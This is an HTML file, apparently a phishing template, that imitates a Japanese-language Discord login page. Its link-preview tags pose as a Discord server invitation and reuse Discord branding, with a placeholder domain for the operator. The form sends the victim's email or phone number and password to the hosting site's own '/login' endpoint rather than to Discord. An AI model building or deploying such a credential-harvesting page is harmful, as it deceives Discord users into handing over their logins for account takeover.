<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discordログイン画面</title>
    
    <meta property="og:type" content="website">
    <meta property="og:title" content="サーバーへの招待を受け取りました">
    <meta property="og:description" content="Discordで友達やコミュニティと一緒に過ごしましょう。チャット、ボイス、ビデオでつながることができます。">
    <meta property="og:url" content="https://your-domain.com/"> <meta property="og:image" content="https://discord.com/assets/ee7c382d92576551b885.png"> <meta property="og:site_name" content="Discord">
    
    <meta name="twitter:card" content="summary_large_image">
    
    <meta name="theme-color" content="#5865F2">

    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="login-header">
                <h2>おかえりなさい！</h2>
                <p>また会えて嬉しいです！</p>
            </div>
            
            <form class="login-form" action="/login" method="POST">
                <div class="form-group">
                    <label>メールアドレスまたは電話番号 <span>*</span></label>
                    <input type="text" name="email" required>
                </div>
                
                <div class="form-group">
                    <label>パスワード <span>*</span></label>
                    <input type="password" name="password" required>
                    <a href="#" class="forgot-password">パスワードをお忘れですか？</a>
                </div>
                
                <button type="submit" class="login-button">ログイン</button>
                
                <div class="register-text">
                    アカウントが必要ですか？ <a href="#">登録</a>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
